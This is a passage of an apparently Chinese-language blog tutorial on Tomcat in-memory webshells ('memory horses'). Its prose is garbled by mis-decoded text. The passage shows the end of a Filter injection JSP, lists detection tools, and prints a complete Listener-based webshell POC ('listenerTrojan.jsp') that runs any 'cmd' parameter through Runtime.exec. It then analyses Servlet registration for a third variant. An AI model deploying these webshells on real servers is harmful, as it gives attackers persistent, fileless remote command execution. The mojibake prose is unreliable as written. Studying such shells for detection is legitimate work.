class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">  filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">  <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">  filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">  standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">&quot;Inject done&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215641112.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215641112.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œä¸”ä¸éœ€è¦æŒ‡å®šjspè·¯å¾„ï¼Œå› ä¸ºæ³¨å†Œçš„filterMapçš„patternä¸º<code>/*</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="æ’æŸ¥å†…å­˜é©¬"><a href="#æ’æŸ¥å†…å­˜é©¬" class="headerlink" title="æ’æŸ¥å†…å­˜é©¬"></a>æ’æŸ¥å†…å­˜é©¬</h2><h4 id="arthas"><a href="#arthas" class="headerlink" title="arthas"></a>arthas</h4><p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥é¡¹ç›®æ¥æ£€æµ‹æˆ‘ä»¬çš„å†…å­˜é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar arthas-boot.jar --telnet-port 9998 --http-port -1</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ <code>java -jar arthas-boot.jar</code></p><h4 id="copagent"><a href="#copagent" class="headerlink" title="copagent"></a>copagent</h4><p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></p><h4 id="java-memshell-scanner"><a href="#java-memshell-scanner" class="headerlink" title="java-memshell-scanner"></a>java-memshell-scanner</h4><p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><h2 id="äºŒã€Listenerå†…å­˜é©¬"><a href="#äºŒã€Listenerå†…å­˜é©¬" class="headerlink" title="äºŒã€Listenerå†…å­˜é©¬"></a>äºŒã€Listenerå†…å­˜é©¬</h2><p>Listenerç”¨æ¥ç›‘å¬å¯¹è±¡åˆ›å»ºã€é”€æ¯ã€å±æ€§å¢åˆ æ”¹ï¼Œç„¶åæ‰§è¡Œå¯¹åº”çš„æ“ä½œã€‚</p><p>åœ¨Tomcatä¸­ï¼ŒListener-&gt;Filter-&gt;Servletä¾æ¬¡æ‰§è¡Œã€‚</p><p>Tomcatæ”¯æŒä¸¤ç§listenerï¼š<code>org.apache.catalina.LifecycleListener</code>å’Œ<code>Java.util.EvenListener</code>,å‰è€…ä¸€èˆ¬ä¸èƒ½ä½¿ç”¨</p><p>å®ç°äº†EvenListenerçš„ServletRequestListenerå¯ä»¥ç›‘å¬Requestè¯·æ±‚çš„åˆ›å»ºå’Œé”€æ¯ï¼ˆè¿™ä¹ˆå¥½çš„ç±»å½“ç„¶è¦æ‹¿æ¥åšå†…å­˜é©¬</p><h3 id="ServletRequestListenerè°ƒç”¨æµç¨‹"><a href="#ServletRequestListenerè°ƒç”¨æµç¨‹" class="headerlink" title="ServletRequestListenerè°ƒç”¨æµç¨‹"></a>ServletRequestListenerè°ƒç”¨æµç¨‹</h3><ul><li><p>requeståˆ›å»ºæ—¶ï¼šåœ¨servlet doGetæ–¹æ³•å¤„æ‰“ä¸Šæ–­ç‚¹åˆ†æï¼Œç„¶ågetè®¿é—®webservlet</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134615308.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134615308.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p></li></ul><p>servletå¯åŠ¨æ—¶ï¼Œåœ¨StandardHostValue#invoke()ä¸­å¯¹ç›‘å¬å™¨è¿›è¡Œæ£€æŸ¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134738674.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134738674.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228135848468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228135848468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­context.fireRequestInitEventè°ƒç”¨getApplicationEventListenersæ–¹æ³•è·å–å…¨éƒ¨Listener</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140322433.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140322433.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ifåˆ¤æ–­æœ‰Listenerå¹¶ä¸”ä¸ºServletRequestListenerå­ç±»ï¼Œå°±è°ƒç”¨ServletRequestListener#requestInitialized()æ–¹æ³•</p><ul><li>Requesté”€æ¯ï¼š</li></ul><p>åœ¨StandardHostValue#invoke()ä¸‹é¢ï¼Œè°ƒç”¨fireRequestDistroyEvent()é”€æ¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140857022.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140857022.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®é™…ä¸Šä¹Ÿå°±æ˜¯getApplicationEventListenersæ–¹æ³•è·å–å…¨éƒ¨Listeneråï¼Œä½¿ç”¨ServletRequestListener#requestDestroyed()æ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228141004954.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228141004954.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”±æ­¤å¯è§ç”ŸæˆListeneråªéœ€è¦ç»è¿‡ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯requestInitialized()ï¼Œä¸€ä¸ªæ˜¯requestDestroyed()ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•é‡å†™åæ•ˆæœæ˜¯ä¸€æ ·çš„</p><ul><li>æ„å»ºListenerå†…å­˜é©¬æµç¨‹ï¼šç”Ÿæˆæ¶æ„Listenerï¼Œç„¶åæ”¾å…¥Context</li></ul><h3 id="1-è·å–context-1"><a href="#1-è·å–context-1" class="headerlink" title="1.è·å–context"></a>1.è·å–context</h3><p>ä¸Šæ–‡å·²ç»ä»‹ç»äº†å¦‚ä½•è·å–contextï¼Œä¸€æ ·çš„é€šè¿‡åå°„è·å–Requestï¼Œç„¶åè·å–StandardContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure><h3 id="2-ç”Ÿæˆæ¶æ„Listener"><a href="#2-ç”Ÿæˆæ¶æ„Listener" class="headerlink" title="2.ç”Ÿæˆæ¶æ„Listener"></a>2.ç”Ÿæˆæ¶æ„Listener</h3><p>getParameterè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹å°±ä¸å¤šè¯´äº†ã€‚åˆ›å»ºListeneréœ€è¦æ‰§è¡ŒServletRequestListener#requestInitialized()ï¼Œé‚£å°±newä¸€ä¸ªServletRequestListenerç±»ç„¶åé‡å†™requestInitializedæ–¹æ³•ã€‚</p><p>ServletRequestEventæä¾›äº†getServletRequest()æ–¹æ³•è·å–request</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228143920730.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228143920730.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸Šé¢è·å–contextè¿‡ç¨‹ä¸­ç”¨åˆ°çš„request1ä¸ºRequestå¯¹è±¡ï¼Œå°è£…äº†getterè·å–response</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144502202.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144502202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> request1.getResponse();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(out);</span><br><span class="line">                    resp.getWriter().flush();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException ioe)&#123;</span><br><span class="line">                    ioe.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-æ·»åŠ Listener"><a href="#3-æ·»åŠ Listener" class="headerlink" title="3.æ·»åŠ Listener"></a>3.æ·»åŠ Listener</h3><p>åå°„è·å–çš„StandardContextæœ‰addApplicationEventListener()æ·»åŠ Listener</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144911877.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144911877.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(listener);</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œrequest1éœ€è¦ç”¨finalä¿®é¥°ï¼Œä¸ç„¶åœ¨newServletRequestListeneråŒ¿åå†…éƒ¨ç±»é‡Œæ— æ³•ä½¿ç”¨ï¼Œä¼šæŠ¥<code>Cannot refer to the non-final local variable request1 defined in an enclosing scope</code>é”™è¯¯</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// listenerTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">  requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">      <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">      <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> request1.getResponse();</span><br><span class="line">      <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">          <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">          <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">          resp.getWriter().write(out);</span><br><span class="line">          resp.getWriter().flush();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException ioe)&#123;</span><br><span class="line">          ioe.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  standardContext.addApplicationEventListener(listener);</span><br><span class="line">  out.println(<span class="string">&quot;inject done!&quot;</span>);</span><br><span class="line">  out.flush();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228161031927.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228161031927.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="ä¸‰ã€Servletå†…å­˜é©¬"><a href="#ä¸‰ã€Servletå†…å­˜é©¬" class="headerlink" title="ä¸‰ã€Servletå†…å­˜é©¬"></a>ä¸‰ã€Servletå†…å­˜é©¬</h2><p>Servletå¼€å§‹äºWebå®¹å™¨å¯åŠ¨ï¼Œç›´åˆ°Webå®¹å™¨åœæ­¢è¿è¡Œã€‚è¦æ³¨å…¥servletï¼Œå°±éœ€è¦å¼€å¯åŠ¨æ€æ·»åŠ Servletï¼Œåœ¨Tomcat7ä»¥åæ‰æœ‰addServlet()æ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228164745479.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228164745479.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="Servletç”Ÿæˆä¸é…ç½®"><a href="#Servletç”Ÿæˆä¸é…ç½®" class="headerlink" title="Servletç”Ÿæˆä¸é…ç½®"></a>Servletç”Ÿæˆä¸é…ç½®</h3><h4 id="Servletæ³¨å†Œ"><a href="#Servletæ³¨å†Œ" class="headerlink" title="Servletæ³¨å†Œ"></a>Servletæ³¨å†Œ</h4><p>Context è´Ÿè´£ç®¡ç† Wapper ï¼Œè€Œ Wapper åˆè´Ÿè´£ç®¡ç† Servlet å®ä¾‹ã€‚</p><p>é€šè¿‡StandardContext.createWapper()åˆ›å»ºWapperå¯¹è±¡ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228165443196.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228165443196.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ›å»ºå¥½äº†Wapperï¼Œè·Ÿè¿›ä¸€ä¸‹Servleté…ç½®æµç¨‹ï¼Œåœ¨ org.apache.catalina.core.StandardWapper#setServletClass() ä¸‹æ–­ç‚¹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170338418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170338418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ContextConfig#webconfig()å¤„é…ç½®webconfigï¼Œæ ¹æ®web.xmlé…ç½®context</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170613977.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170613977.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åè°ƒç”¨äº†configureContext()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170844431.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170844431.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>configureContext()ä¾æ¬¡è¯»å–äº† Filterã€Listenerã€Servletçš„é…ç½®åŠå…¶æ˜ å°„</p><p>åœ¨Servletéƒ¨åˆ†createWrapper()ã€è®¾ç½®äº†å¯åŠ¨ä¼˜å…ˆçº§LoadOnStartUpä»¥åŠservletNameã€‚è¿™é‡ŒloadOnStartupå°±æ˜¯è´Ÿè´£åŠ¨æ€æ·»åŠ Servletçš„å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171737407.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171737407.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åè®¾ç½®äº†servletClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171953290.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171953290.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€åæŠŠwrapper æ·»åŠ è¿›contextçš„child</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228172017882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228172017882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¾ªç¯éå†å®Œäº†æ‰€æœ‰servletsï¼Œæ¥ä¸‹æ¥æ·»åŠ Servlet-Mapperï¼Œä¹Ÿå°±æ˜¯web.xmlä¸­çš„<code>&lt;servlet-mapping&gt;</code>ã€‚å¾ªç¯addServletMappingDecodedå°†urlå’Œservletç±»åšæ˜ å°„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228204837168.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228204837168.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ€»ç»“ä¸€ä¸‹servletæ³¨å†Œè¿‡ç¨‹ï¼š</p><ol><li>è°ƒç”¨StandardContext.createWrapperä¸ºservletåˆ›å»ºwrapper</li><li>é…ç½®LoadOnStartupå¯åŠ¨ä¼˜å…ˆçº§</li><li>é…ç½®ServletName</li><li>é…ç½®ServletClass</li><li>addChildæ·»åŠ wrapperåˆ°Context</li><li>addServletMappingDecodeæ·»åŠ æ˜ å°„</li></ol><p>å…¶å®åˆ°è¿™é‡Œå°±èƒ½æ¨¡æ‹Ÿservletæ³¨å†Œæ„é€ å†…å­˜é©¬äº†</p><p>ä¸è¿‡LoadOnStartupè®¾ç½®ä¼˜å…ˆçº§ï¼Œä¹Ÿå°±æ˜¯åŠ¨æ€æ·»åŠ servletçš„è¿‡ç¨‹è¿˜ä¸æ¸…æ¥š</p><h4 id="wrapperè£…è½½"><a href="#wrapperè£…è½½" class="headerlink" title="wrapperè£…è½½"></a>wrapperè£…è½½</h4><p>è·Ÿè¿›åˆ°startInternalï¼Œå‘ç°åœ¨åŠ è½½å®ŒListenerå’ŒFilteråï¼Œå¼€å§‹loadOnstartup</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211713270.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211713270.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211738904.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211738904.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>findChildren()å°†æ‰€æœ‰Wrapperä¼ å…¥loadOnStartup()å¤„ç†ï¼ŒloadOnStartupè·å–åˆ°æ‰€æœ‰Wrapperchildï¼Œå¹¶ä¸”getLoadOnstartupè·å–åˆ°servletå¯åŠ¨é¡ºåºï¼Œ&gt;&#x3D;0çš„å­˜æ”¾åœ¨wapper_list</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212118310.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212118310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœloadOnstartup&lt;0ï¼Œåˆ™ä¸ä¼šè¢«åŠ¨æ€æ·»åŠ åˆ°å®¹å™¨ã€‚è¯¥å±æ€§å¯¹åº”äº†web.xmlä¸­çš„<code>&lt;load-on-startup&gt;</code>ï¼Œè¯¥å±æ€§é»˜è®¤-1</p><p>å¾ªç¯è£…è½½wrapper</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212926651.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212926651.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è£…è½½è¿‡ç¨‹æ€»çš„ä¸€å¥è¯ï¼ŒLoadOnStartup&gt;&#x3D;0æ‰è¡Œ</p><h3 id="1-è·å–context-2"><a href="#1-è·å–context-2" 